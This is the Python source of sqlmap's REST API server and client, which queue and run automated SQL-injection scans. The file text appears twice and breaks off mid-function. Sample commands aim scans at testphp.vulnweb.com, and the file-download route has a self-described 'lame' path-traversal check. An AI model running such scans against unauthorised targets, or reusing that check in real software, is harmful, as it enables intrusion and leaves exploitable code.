        self.connection.commit()

    def execute(self, statement, arguments=None):
        while True:
            try:
                if arguments:
                    self.cursor.execute(statement, arguments)
                else:
                    self.cursor.execute(statement)
            except sqlite3.OperationalError, ex:
                if not "locked" in getSafeExString(ex):
                    raise
            else:
                break

        if statement.lstrip().upper().startswith("SELECT"):
            return self.cursor.fetchall()

    def init(self):
        self.execute("CREATE TABLE logs("
                  "id INTEGER PRIMARY KEY AUTOINCREMENT, "
                  "taskid INTEGER, time TEXT, "
                  "level TEXT, message TEXT"
                  ")")

        self.execute("CREATE TABLE data("
                  "id INTEGER PRIMARY KEY AUTOINCREMENT, "
                  "taskid INTEGER, status INTEGER, "
                  "content_type INTEGER, value TEXT"
                  ")")

        self.execute("CREATE TABLE errors("
                    "id INTEGER PRIMARY KEY AUTOINCREMENT, "
                    "taskid INTEGER, error TEXT"
                    ")")


class Task(object):
    def __init__(self, taskid, remote_addr):
        self.remote_addr = remote_addr
        self.process = None
        self.output_directory = None
        self.options = None
        self._original_options = None
        self.initialize_options(taskid)

    def initialize_options(self, taskid):
        datatype = {"boolean": False, "string": None, "integer": None, "float": None}
        self.options = AttribDict()

        for _ in optDict:
            for name, type_ in optDict[_].items():
                type_ = unArrayizeValue(type_)
                self.options[name] = _defaults.get(name, datatype[type_])

        # Let sqlmap engine knows it is getting called by the API,
        # the task ID and the file path of the IPC database
        self.options.api = True
        self.options.taskid = taskid
        self.options.database = Database.filepath

        # Enforce batch mode and disable coloring and ETA
        self.options.batch = True
        self.options.disableColoring = True
        self.options.eta = False

        self._original_options = AttribDict(self.options)

    def set_option(self, option, value):
        self.options[option] = value

    def get_option(self, option):
        return self.options[option]

    def get_options(self):
        return self.options

    def reset_options(self):
        self.options = AttribDict(self._original_options)

    def engine_start(self):
        if os.path.exists("sqlmap.py"):
            self.process = Popen(["python", "sqlmap.py", "--pickled-options", base64pickle(self.options)], shell=False, close_fds=not IS_WIN)
        else:
            self.process = Popen(["sqlmap", "--pickled-options", base64pickle(self.options)], shell=False, close_fds=not IS_WIN)

    def engine_stop(self):
        if self.process:
            self.process.terminate()
            return self.process.wait()
        else:
            return None

    def engine_process(self):
        return self.process

    def engine_kill(self):
        if self.process:
            try:
                self.process.kill()
                return self.process.wait()
            except:
                pass
        return None

    def engine_get_id(self):
        if self.process:
            return self.process.pid
        else:
            return None

    def engine_get_returncode(self):
        if self.process:
            self.process.poll()
            return self.process.returncode
        else:
            return None

    def engine_has_terminated(self):
        return isinstance(self.engine_get_returncode(), int)


# Wrapper functions for sqlmap engine
class StdDbOut(object):
    def __init__(self, taskid, messagetype="stdout"):
        # Overwrite system standard output and standard error to write
        # to an IPC database
        self.messagetype = messagetype
        self.taskid = taskid

        if self.messagetype == "stdout":
            sys.stdout = self
        else:
            sys.stderr = self

    def write(self, value, status=CONTENT_STATUS.IN_PROGRESS, content_type=None):
        if self.messagetype == "stdout":
            if content_type is None:
                if kb.partRun is not None:
                    content_type = PART_RUN_CONTENT_TYPES.get(kb.partRun)
                else:
                    # Ignore all non-relevant messages
                    return

            output = conf.database_cursor.execute(
                "SELECT id, status, value FROM data WHERE taskid = ? AND content_type = ?",
                (self.taskid, content_type))

            # Delete partial output from IPC database if we have got a complete output
            if status == CONTENT_STATUS.COMPLETE:
                if len(output) > 0:
                    for index in xrange(len(output)):
                        conf.database_cursor.execute("DELETE FROM data WHERE id = ?",
                                                     (output[index][0],))

                conf.database_cursor.execute("INSERT INTO data VALUES(NULL, ?, ?, ?, ?)",
                                             (self.taskid, status, content_type, jsonize(value)))
                if kb.partRun:
                    kb.partRun = None

            elif status == CONTENT_STATUS.IN_PROGRESS:
                if len(output) == 0:
                    conf.database_cursor.execute("INSERT INTO data VALUES(NULL, ?, ?, ?, ?)",
                                                 (self.taskid, status, content_type,
                                                  jsonize(value)))
                else:
                    new_value = "%s%s" % (dejsonize(output[0][2]), value)
                    conf.database_cursor.execute("UPDATE data SET value = ? WHERE id = ?",
                                                 (jsonize(new_value), output[0][0]))
        else:
            conf.database_cursor.execute("INSERT INTO errors VALUES(NULL, ?, ?)",
                                         (self.taskid, str(value) if value else ""))

    def flush(self):
        pass

    def close(self):
        pass

    def seek(self):
        pass


class LogRecorder(logging.StreamHandler):
    def emit(self, record):
        """
        Record emitted events to IPC database for asynchronous I/O
        communication with the parent process
        """
        conf.database_cursor.execute("INSERT INTO logs VALUES(NULL, ?, ?, ?, ?)",
                                     (conf.taskid, time.strftime("%X"), record.levelname,
                                      record.msg % record.args if record.args else record.msg))


def setRestAPILog():
    if hasattr(conf, "api"):
        try:
            conf.database_cursor = Database(conf.database)
            conf.database_cursor.connect("client")
        except sqlite3.OperationalError, ex:
            raise SqlmapConnectionException, "%s ('%s')" % (ex, conf.database)

        # Set a logging handler that writes log messages to a IPC database
        logger.removeHandler(LOGGER_HANDLER)
        LOGGER_RECORDER = LogRecorder()
        logger.addHandler(LOGGER_RECORDER)


# Generic functions
def is_admin(taskid):
    return DataStore.admin_id == taskid


@hook("after_request")
def security_headers(json_header=True):
    """
    Set some headers across all HTTP responses
    """
    response.headers["Server"] = "Server"
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["X-XSS-Protection"] = "1; mode=block"
    response.headers["Pragma"] = "no-cache"
    response.headers["Cache-Control"] = "no-cache"
    response.headers["Expires"] = "0"
    if json_header:
        response.content_type = "application/json; charset=UTF-8"

##############################
# HTTP Status Code functions #
##############################


@return_error(401)  # Access Denied
def error401(error=None):
    security_headers(False)
    return "Access denied"


@return_error(404)  # Not Found
def error404(error=None):
    security_headers(False)
    return "Nothing here"


@return_error(405)  # Method Not Allowed (e.g. when requesting a POST method via GET)
def error405(error=None):
    security_headers(False)
    return "Method not allowed"


@return_error(500)  # Internal Server Error
def error500(error=None):
    security_headers(False)
    return "Internal server error"

#############################
# Task management functions #
#############################


# Users' methods
@get("/task/new")
def task_new():
    """
    Create new task ID
    """
    taskid = hexencode(os.urandom(8))
    remote_addr = request.remote_addr

    DataStore.tasks[taskid] = Task(taskid, remote_addr)

    logger.debug("Created new task: '%s'" % taskid)
    return jsonize({"success": True, "taskid": taskid})


@get("/task/<taskid>/delete")
def task_delete(taskid):
    """
    Delete own task ID
    """
    if taskid in DataStore.tasks:
        DataStore.tasks.pop(taskid)

        logger.debug("[%s] Deleted task" % taskid)
        return jsonize({"success": True})
    else:
        logger.warning("[%s] Invalid task ID provided to task_delete()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

###################
# Admin functions #
###################


@get("/admin/<taskid>/list")
def task_list(taskid=None):
    """
    List task pull
    """
    tasks = {}

    for key in DataStore.tasks:
        if is_admin(taskid) or DataStore.tasks[key].remote_addr == request.remote_addr:
            tasks[key] = dejsonize(scan_status(key))["status"]

    logger.debug("[%s] Listed task pool (%s)" % (taskid, "admin" if is_admin(taskid) else request.remote_addr))
    return jsonize({"success": True, "tasks": tasks, "tasks_num": len(tasks)})

@get("/admin/<taskid>/flush")
def task_flush(taskid):
    """
    Flush task spool (delete all tasks)
    """

    for key in list(DataStore.tasks):
        if is_admin(taskid) or DataStore.tasks[key].remote_addr == request.remote_addr:
            DataStore.tasks[key].engine_kill()
            del DataStore.tasks[key]

    logger.debug("[%s] Flushed task pool (%s)" % (taskid, "admin" if is_admin(taskid) else request.remote_addr))
    return jsonize({"success": True})

##################################
# sqlmap core interact functions #
##################################


# Handle task's options
@get("/option/<taskid>/list")
def option_list(taskid):
    """
    List options for a certain task ID
    """
    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to option_list()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    logger.debug("[%s] Listed task options" % taskid)
    return jsonize({"success": True, "options": DataStore.tasks[taskid].get_options()})


@post("/option/<taskid>/get")
def option_get(taskid):
    """
    Get the value of an option (command line switch) for a certain task ID
    """
    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to option_get()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    option = request.json.get("option", "")

    if option in DataStore.tasks[taskid].options:
        logger.debug("[%s] Retrieved value for option %s" % (taskid, option))
        return jsonize({"success": True, option: DataStore.tasks[taskid].get_option(option)})
    else:
        logger.debug("[%s] Requested value for unknown option %s" % (taskid, option))
        return jsonize({"success": False, "message": "Unknown option", option: "not set"})


@post("/option/<taskid>/set")
def option_set(taskid):
    """
    Set an option (command line switch) for a certain task ID
    """
    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to option_set()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    for option, value in request.json.items():
        DataStore.tasks[taskid].set_option(option, value)

    logger.debug("[%s] Requested to set options" % taskid)
    return jsonize({"success": True})


# Handle scans
@post("/scan/<taskid>/start")
def scan_start(taskid):
    """
    Launch a scan
    """
    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to scan_start()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    # Initialize sqlmap engine's options with user's provided options, if any
    for option, value in request.json.items():
        DataStore.tasks[taskid].set_option(option, value)

    # Launch sqlmap engine in a separate process
    DataStore.tasks[taskid].engine_start()

    logger.debug("[%s] Started scan" % taskid)
    return jsonize({"success": True, "engineid": DataStore.tasks[taskid].engine_get_id()})


@get("/scan/<taskid>/stop")
def scan_stop(taskid):
    """
    Stop a scan
    """
    if (taskid not in DataStore.tasks or
            DataStore.tasks[taskid].engine_process() is None or
            DataStore.tasks[taskid].engine_has_terminated()):
        logger.warning("[%s] Invalid task ID provided to scan_stop()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    DataStore.tasks[taskid].engine_stop()

    logger.debug("[%s] Stopped scan" % taskid)
    return jsonize({"success": True})


@get("/scan/<taskid>/kill")
def scan_kill(taskid):
    """
    Kill a scan
    """
    if (taskid not in DataStore.tasks or
            DataStore.tasks[taskid].engine_process() is None or
            DataStore.tasks[taskid].engine_has_terminated()):
        logger.warning("[%s] Invalid task ID provided to scan_kill()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    DataStore.tasks[taskid].engine_kill()

    logger.debug("[%s] Killed scan" % taskid)
    return jsonize({"success": True})


@get("/scan/<taskid>/status")
def scan_status(taskid):
    """
    Returns status of a scan
    """
    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to scan_status()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    if DataStore.tasks[taskid].engine_process() is None:
        status = "not running"
    else:
        status = "terminated" if DataStore.tasks[taskid].engine_has_terminated() is True else "running"

    logger.debug("[%s] Retrieved scan status" % taskid)
    return jsonize({
        "success": True,
        "status": status,
        "returncode": DataStore.tasks[taskid].engine_get_returncode()
    })


@get("/scan/<taskid>/data")
def scan_data(taskid):
    """
    Retrieve the data of a scan
    """
    json_data_message = list()
    json_errors_message = list()

    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to scan_data()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    # Read all data from the IPC database for the taskid
    for status, content_type, value in DataStore.current_db.execute(
            "SELECT status, content_type, value FROM data WHERE taskid = ? ORDER BY id ASC",
            (taskid,)):
        json_data_message.append(
            {"status": status, "type": content_type, "value": dejsonize(value)})

    # Read all error messages from the IPC database
    for error in DataStore.current_db.execute(
            "SELECT error FROM errors WHERE taskid = ? ORDER BY id ASC",
            (taskid,)):
        json_errors_message.append(error)

    logger.debug("[%s] Retrieved scan data and error messages" % taskid)
    return jsonize({"success": True, "data": json_data_message, "error": json_errors_message})


# Functions to handle scans' logs
@get("/scan/<taskid>/log/<start>/<end>")
def scan_log_limited(taskid, start, end):
    """
    Retrieve a subset of log messages
    """
    json_log_messages = list()

    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to scan_log_limited()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    if not start.isdigit() or not end.isdigit() or end < start:
        logger.warning("[%s] Invalid start or end value provided to scan_log_limited()" % taskid)
        return jsonize({"success": False, "message": "Invalid start or end value, must be digits"})

    start = max(1, int(start))
    end = max(1, int(end))

    # Read a subset of log messages from the IPC database
    for time_, level, message in DataStore.current_db.execute(
            ("SELECT time, level, message FROM logs WHERE "
             "taskid = ? AND id >= ? AND id <= ? ORDER BY id ASC"),
            (taskid, start, end)):
        json_log_messages.append({"time": time_, "level": level, "message": message})

    logger.debug("[%s] Retrieved scan log messages subset" % taskid)
    return jsonize({"success": True, "log": json_log_messages})


@get("/scan/<taskid>/log")
def scan_log(taskid):
    """
    Retrieve the log messages
    """
    json_log_messages = list()

    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to scan_log()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    # Read all log messages from the IPC database
    for time_, level, message in DataStore.current_db.execute(
            "SELECT time, level, message FROM logs WHERE taskid = ? ORDER BY id ASC", (taskid,)):
        json_log_messages.append({"time": time_, "level": level, "message": message})

    logger.debug("[%s] Retrieved scan log messages" % taskid)
    return jsonize({"success": True, "log": json_log_messages})


# Function to handle files inside the output directory
@get("/download/<taskid>/<target>/<filename:path>")
def download(taskid, target, filename):
    """
    Download a certain file from the file system
    """
    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to download()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    # Prevent file path traversal - the lame way
    if ".." in target:                    
        logger.warning("[%s] Forbidden path (%s)" % (taskid, target))
        return jsonize({"success": False, "message": "Forbidden path"})

    path = os.path.join(paths.SQLMAP_OUTPUT_PATH, target)                    

    if os.path.exists(path):                    
        logger.debug("[%s] Retrieved content of file %s" % (taskid, target))
        with open(path, 'rb') as inf:
            file_content = inf.read()
        return jsonize({"success": True, "file": file_content.encode("base64")})
    else:
        logger.warning("[%s] File does not exist %s" % (taskid, target))
        return jsonize({"success": False, "message": "File does not exist"})


def server(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT, adapter=RESTAPI_DEFAULT_ADAPTER):
    """
    REST-JSON API server
    """
    DataStore.admin_id = hexencode(os.urandom(16))
    Database.filepath = tempfile.mkstemp(prefix="sqlmapipc-", text=False)[1]

    logger.info("Running REST-JSON API server at '%s:%d'.." % (host, port))
    logger.info("Admin ID: %s" % DataStore.admin_id)
    logger.debug("IPC database: %s" % Database.filepath)

    # Initialize IPC database
    DataStore.current_db = Database()
    DataStore.current_db.connect()
    DataStore.current_db.init()

    # Run RESTful API
    try:
        if adapter == "gevent":
            from gevent import monkey
            monkey.patch_all()
        elif adapter == "eventlet":
            import eventlet
            eventlet.monkey_patch()
        logger.debug("Using adapter '%s' to run bottle" % adapter)
        run(host=host, port=port, quiet=True, debug=False, server=adapter)
    except socket.error, ex:
        if "already in use" in getSafeExString(ex):
            logger.error("Address already in use ('%s:%s')" % (host, port))
        else:
            raise
    except ImportError:
        errMsg = "Adapter '%s' is not available on this system" % adapter
        if adapter in ("gevent", "eventlet"):
            errMsg += " (e.g.: 'sudo apt-get install python-%s')" % adapter
        logger.critical(errMsg)

def _client(url, options=None):
    logger.debug("Calling %s" % url)
    try:
        data = None
        if options is not None:
            data = jsonize(options)
        req = urllib2.Request(url, data, {'Content-Type': 'application/json'})
        response = urllib2.urlopen(req)
        text = response.read()
    except:
        if options:
            logger.error("Failed to load and parse %s" % url)
        raise
    return text


def client(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT):
    """
    REST-JSON API client
    """

    dbgMsg = "Example client access from command line:"
    dbgMsg += "\n\t$ taskid=$(curl http://%s:%d/task/new 2>1 | grep -o -I '[a-f0-9]\{16\}') && echo $taskid" % (host, port)
    dbgMsg += "\n\t$ curl -H \"Content-Type: application/json\" -X POST -d '{\"url\": \"http://testphp.vulnweb.com/artists.php?artist=1\"}' http://%s:%d/scan/$taskid/start" % (host, port)
    dbgMsg += "\n\t$ curl http://%s:%d/scan/$taskid/data" % (host, port)
    dbgMsg += "\n\t$ curl http://%s:%d/scan/$taskid/log" % (host, port)
    logger.debug(dbgMsg)

    addr = "http://%s:%d" % (host, port)
    logger.info("Starting REST-JSON API client to '%s'..." % addr)

    try:
        _client(addr)
    except Exception, ex:
        if not isinstance(ex, urllib2.HTTPError):
            errMsg = "There has been a problem while connecting to the "
            errMsg += "REST-JSON API server at '%s' " % addr
            errMsg += "(%s)" % ex
            logger.critical(errMsg)
            return

    taskid = None
    logger.info("Type 'help' or '?' for list of available commands")

    while True:
        try:
            command = raw_input("api%s> " % (" (%s)" % taskid if taskid else "")).strip().lower()
        except (EOFError, KeyboardInterrupt):
            print
            break

        if command in ("data", "log", "status", "stop", "kill"):
            if not taskid:
                logger.error("No task ID in use")
                continue
            raw = _client("%s/scan/%s/%s" % (addr, taskid, command))
            res = dejsonize(raw)
            if not res["success"]:
                logger.error("Failed to execute command %s" % command)
            dataToStdout("%s\n" % raw)

        elif command.startswith("new"):
            if ' ' not in command:
                logger.error("Program arguments are missing")
                continue

            argv = ["sqlmap.py"] + shlex.split(command)[1:]

            try:
                cmdLineOptions = cmdLineParser(argv).__dict__
            except:
                taskid = None
                continue

            for key in list(cmdLineOptions):
                if cmdLineOptions[key] is None:
                    del cmdLineOptions[key]

            raw = _client("%s/task/new" % addr)
            res = dejsonize(raw)
            if not res["success"]:
                logger.error("Failed to create new task")
                continue
            taskid = res["taskid"]
            logger.info("New task ID is '%s'" % taskid)

            raw = _client("%s/scan/%s/start" % (addr, taskid), cmdLineOptions)
            res = dejsonize(raw)
            if not res["success"]:
                logger.error("Failed to start scan")
                continue
            logger.info("Scanning started")

        elif command.startswith("use"):
            taskid = (command.split()[1] if ' ' in command else "").strip("'\"")
            if not taskid:
                logger.error("Task ID is missing")
                taskid = None
                continue
            elif not re.search(r"\A[0-9a-fA-F]{16}\Z", taskid):
                logger.error("Invalid task ID '%s'" % taskid)
                taskid = None
                continue
            logger.info("Switching to task ID '%s' " % taskid)

        elif command in ("list", "flush"):
            raw = _client("%s/admin/%s/%s" % (addr, taskid or 0, command))
            res = dejsonize(raw)
            if not res["success"]:
                logger.error("Failed to execute command %s" % command)
            elif command == "flush":
                taskid = None
            dataToStdout("%s\n" % raw)

        elif command in ("exit", "bye", "quit", 'q'):
            return

        elif command in ("help", "?"):
            msg =  "help        Show this help message\n"
            msg += "new ARGS    Start a new scan task with provided arguments (e.g. 'new -u \"http://testphp.vulnweb.com/artists.php?artist=1\"')\n"
            msg += "use TASKID  Switch current context to different task (e.g. 'use c04d8c5c7582efb4')\n"
            msg += "data        Retrieve and show data for current task\n"
            msg += "log         Retrieve and show log for current task\n"
            msg += "status      Retrieve and show status for current task\n"
            msg += "stop        Stop current task\n"
            msg += "kill        Kill current task\n"
            msg += "list        Display all tasks\n"
            msg += "flush       Flush tasks (delete all tasks)\n"
            msg += "exit        Exit this client\n"

            dataToStdout(msg)

        elif command:
            logger.error("Unknown command '%s'" % command)

#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import logging
import os
import re
import shlex
import socket
import sqlite3
import sys
import tempfile
import time
import urllib2

from lib.core.common import dataToStdout
from lib.core.common import getSafeExString
from lib.core.common import unArrayizeValue
from lib.core.convert import base64pickle
from lib.core.convert import hexencode
from lib.core.convert import dejsonize
from lib.core.convert import jsonize
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import paths
from lib.core.data import logger
from lib.core.datatype import AttribDict
from lib.core.defaults import _defaults
from lib.core.enums import CONTENT_STATUS
from lib.core.enums import PART_RUN_CONTENT_TYPES
from lib.core.exception import SqlmapConnectionException
from lib.core.log import LOGGER_HANDLER
from lib.core.optiondict import optDict
from lib.core.settings import RESTAPI_DEFAULT_ADAPTER
from lib.core.settings import IS_WIN
from lib.core.settings import RESTAPI_DEFAULT_ADDRESS
from lib.core.settings import RESTAPI_DEFAULT_PORT
from lib.core.subprocessng import Popen
from lib.parse.cmdline import cmdLineParser
from thirdparty.bottle.bottle import error as return_error
from thirdparty.bottle.bottle import get
from thirdparty.bottle.bottle import hook
from thirdparty.bottle.bottle import post
from thirdparty.bottle.bottle import request
from thirdparty.bottle.bottle import response
from thirdparty.bottle.bottle import run


# global settings
class DataStore(object):
    admin_id = ""
    current_db = None
    tasks = dict()


# API objects
class Database(object):
    filepath = None

    def __init__(self, database=None):
        self.database = self.filepath if database is None else database
        self.connection = None
        self.cursor = None

    def connect(self, who="server"):
        self.connection = sqlite3.connect(self.database, timeout=3, isolation_level=None)
        self.cursor = self.connection.cursor()
        logger.debug("REST-JSON API %s connected to IPC database" % who)

    def disconnect(self):
        if self.cursor:
            self.cursor.close()

        if self.connection:
            self.connection.close()

    def commit(self):
        self.connection.commit()

    def execute(self, statement, arguments=None):
        while True:
            try:
                if arguments:
                    self.cursor.execute(statement, arguments)
                else:
                    self.cursor.execute(statement)
            except sqlite3.OperationalError, ex:
                if not "locked" in getSafeExString(ex):
                    raise
            else:
                break

        if statement.lstrip().upper().startswith("SELECT"):
            return self.cursor.fetchall()

    def init(self):
        self.execute("CREATE TABLE logs("
                  "id INTEGER PRIMARY KEY AUTOINCREMENT, "
                  "taskid INTEGER, time TEXT, "
                  "level TEXT, message TEXT"
                  ")")

        self.execute("CREATE TABLE data("
                  "id INTEGER PRIMARY KEY AUTOINCREMENT, "
                  "taskid INTEGER, status INTEGER, "
                  "content_type INTEGER, value TEXT"
                  ")")

        self.execute("CREATE TABLE errors("
                    "id INTEGER PRIMARY KEY AUTOINCREMENT, "
                    "taskid INTEGER, error TEXT"
                    ")")


class Task(object):
    def __init__(self, taskid, remote_addr):
        self.remote_addr = remote_addr
        self.process = None
        self.output_directory = None
        self.options = None
        self._original_options = None
        self.initialize_options(taskid)

    def initialize_options(self, taskid):
        datatype = {"boolean": False, "string": None, "integer": None, "float": None}
        self.options = AttribDict()

        for _ in optDict:
            for name, type_ in optDict[_].items():
                type_ = unArrayizeValue(type_)
                self.options[name] = _defaults.get(name, datatype[type_])

        # Let sqlmap engine knows it is getting called by the API,
        # the task ID and the file path of the IPC database
        self.options.api = True
        self.options.taskid = taskid
        self.options.database = Database.filepath

        # Enforce batch mode and disable coloring and ETA
        self.options.batch = True
        self.options.disableColoring = True
        self.options.eta = False

        self._original_options = AttribDict(self.options)

    def set_option(self, option, value):
        self.options[option] = value

    def get_option(self, option):
        return self.options[option]

    def get_options(self):
        return self.options

    def reset_options(self):
        self.options = AttribDict(self._original_options)

    def engine_start(self):
        if os.path.exists("sqlmap.py"):
            self.process = Popen(["python", "sqlmap.py", "--pickled-options", base64pickle(self.options)], shell=False, close_fds=not IS_WIN)
        else:
            self.process = Popen(["sqlmap", "--pickled-options", base64pickle(self.options)], shell=False, close_fds=not IS_WIN)

    def engine_stop(self):
        if self.process:
            self.process.terminate()
            return self.process.wait()
        else:
            return None

    def engine_process(self):
        return self.process

    def engine_kill(self):
        if self.process:
            try:
                self.process.kill()
                return self.process.wait()
            except:
                pass
        return None

    def engine_get_id(self):
        if self.process:
            return self.process.pid
        else:
            return None

    def engine_get_returncode(self):
        if self.process:
            self.process.poll()
            return self.process.returncode
        else:
            return None

    def engine_has_terminated(self):
        return isinstance(self.engine_get_returncode(), int)


# Wrapper functions for sqlmap engine
class StdDbOut(object):
    def __init__(self, taskid, messagetype="stdout"):
        # Overwrite system standard output and standard error to write
        # to an IPC database
        self.messagetype = messagetype
        self.taskid = taskid

        if self.messagetype == "stdout":
            sys.stdout = self
        else:
            sys.stderr = self

    def write(self, value, status=CONTENT_STATUS.IN_PROGRESS, content_type=None):
        if self.messagetype == "stdout":
            if content_type is None:
                if kb.partRun is not None:
                    content_type = PART_RUN_CONTENT_TYPES.get(kb.partRun)
                else:
                    # Ignore all non-relevant messages
                    return

            output = conf.database_cursor.execute(
                "SELECT id, status, value FROM data WHERE taskid = ? AND content_type = ?",
                (self.taskid, content_type))

            # Delete partial output from IPC database if we have got a complete output
            if status == CONTENT_STATUS.COMPLETE:
                if len(output) > 0:
                    for index in xrange(len(output)):
                        conf.database_cursor.execute("DELETE FROM data WHERE id = ?",
                                                     (output[index][0],))

                conf.database_cursor.execute("INSERT INTO data VALUES(NULL, ?, ?, ?, ?)",
                                             (self.taskid, status, content_type, jsonize(value)))
                if kb.partRun:
                    kb.partRun = None

            elif status == CONTENT_STATUS.IN_PROGRESS:
                if len(output) == 0:
                    conf.database_cursor.execute("INSERT INTO data VALUES(NULL, ?, ?, ?, ?)",
                                                 (self.taskid, status, content_type,
                                                  jsonize(value)))
                else:
                    new_value = "%s%s" % (dejsonize(output[0][2]), value)
                    conf.database_cursor.execute("UPDATE data SET value = ? WHERE id = ?",
                                                 (jsonize(new_value), output[0][0]))
        else:
            conf.database_cursor.execute("INSERT INTO errors VALUES(NULL, ?, ?)",
                                         (self.taskid, str(value) if value else ""))

    def flush(self):
        pass

    def close(self):
        pass

    def seek(self):
        pass


class LogRecorder(logging.StreamHandler):
    def emit(self, record):
        """
        Record emitted events to IPC database for asynchronous I/O
        communication with the parent process
        """
        conf.database_cursor.execute("INSERT INTO logs VALUES(NULL, ?, ?, ?, ?)",
                                     (conf.taskid, time.strftime("%X"), record.levelname,
                                      record.msg % record.args if record.args else record.msg))


def setRestAPILog():
    if hasattr(conf, "api"):
        try:
            conf.database_cursor = Database(conf.database)
            conf.database_cursor.connect("client")
        except sqlite3.OperationalError, ex:
            raise SqlmapConnectionException, "%s ('%s')" % (ex, conf.database)

        # Set a logging handler that writes log messages to a IPC database
        logger.removeHandler(LOGGER_HANDLER)
        LOGGER_RECORDER = LogRecorder()
        logger.addHandler(LOGGER_RECORDER)


# Generic functions
def is_admin(taskid):
    return DataStore.admin_id == taskid


@hook("after_request")
def security_headers(json_header=True):
    """
    Set some headers across all HTTP responses
    """
    response.headers["Server"] = "Server"
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["X-XSS-Protection"] = "1; mode=block"
    response.headers["Pragma"] = "no-cache"
    response.headers["Cache-Control"] = "no-cache"
    response.headers["Expires"] = "0"
    if json_header:
        response.content_type = "application/json; charset=UTF-8"

##############################
# HTTP Status Code functions #
##############################


@return_error(401)  # Access Denied
def error401(error=None):
    security_headers(False)
    return "Access denied"


@return_error(404)  # Not Found
def error404(error=None):
    security_headers(False)
    return "Nothing here"


@return_error(405)  # Method Not Allowed (e.g. when requesting a POST method via GET)
def error405(error=None):
    security_headers(False)
    return "Method not allowed"


@return_error(500)  # Internal Server Error
def error500(error=None):
    security_headers(False)
    return "Internal server error"

#############################
# Task management functions #
#############################


# Users' methods
@get("/task/new")
def task_new():
    """
    Create new task ID
    """
    taskid = hexencode(os.urandom(8))
    remote_addr = request.remote_addr

    DataStore.tasks[taskid] = Task(taskid, remote_addr)

    logger.debug("Created new task: '%s'" % taskid)
    return jsonize({"success": True, "taskid": taskid})


@get("/task/<taskid>/delete")
def task_delete(taskid):
    """
    Delete own task ID
    """
    if taskid in DataStore.tasks:
        DataStore.tasks.pop(taskid)

        logger.debug("[%s] Deleted task" % taskid)
        return jsonize({"success": True})
    else:
        logger.warning("[%s] Invalid task ID provided to task_delete()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

###################
# Admin functions #
###################


@get("/admin/<taskid>/list")
def task_list(taskid=None):
    """
    List task pull
    """
    tasks = {}

    for key in DataStore.tasks:
        if is_admin(taskid) or DataStore.tasks[key].remote_addr == request.remote_addr:
            tasks[key] = dejsonize(scan_status(key))["status"]

    logger.debug("[%s] Listed task pool (%s)" % (taskid, "admin" if is_admin(taskid) else request.remote_addr))
    return jsonize({"success": True, "tasks": tasks, "tasks_num": len(tasks)})

@get("/admin/<taskid>/flush")
def task_flush(taskid):
    """
    Flush task spool (delete all tasks)
    """

    for key in list(DataStore.tasks):
        if is_admin(taskid) or DataStore.tasks[key].remote_addr == request.remote_addr:
            DataStore.tasks[key].engine_kill()
            del DataStore.tasks[key]

    logger.debug("[%s] Flushed task pool (%s)" % (taskid, "admin" if is_admin(taskid) else request.remote_addr))
    return jsonize({"success": True})

##################################
# sqlmap core interact functions #
##################################


# Handle task's options
@get("/option/<taskid>/list")
def option_list(taskid):
    """
    List options for a certain task ID
    """
    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to option_list()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    logger.debug("[%s] Listed task options" % taskid)
    return jsonize({"success": True, "options": DataStore.tasks[taskid].get_options()})


@post("/option/<taskid>/get")
def option_get(taskid):
    """
    Get the value of an option (command line switch) for a certain task ID
    """
    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to option_get()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    option = request.json.get("option", "")

    if option in DataStore.tasks[taskid].options:
        logger.debug("[%s] Retrieved value for option %s" % (taskid, option))
        return jsonize({"success": True, option: DataStore.tasks[taskid].get_option(option)})
    else:
        logger.debug("[%s] Requested value for unknown option %s" % (taskid, option))
        return jsonize({"success": False, "message": "Unknown option", option: "not set"})


@post("/option/<taskid>/set")
def option_set(taskid):
    """
    Set an option (command line switch) for a certain task ID
    """
    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to option_set()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    for option, value in request.json.items():
        DataStore.tasks[taskid].set_option(option, value)

    logger.debug("[%s] Requested to set options" % taskid)
    return jsonize({"success": True})


# Handle scans
@post("/scan/<taskid>/start")
def scan_start(taskid):
    """
    Launch a scan
    """
    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to scan_start()" % taskid)
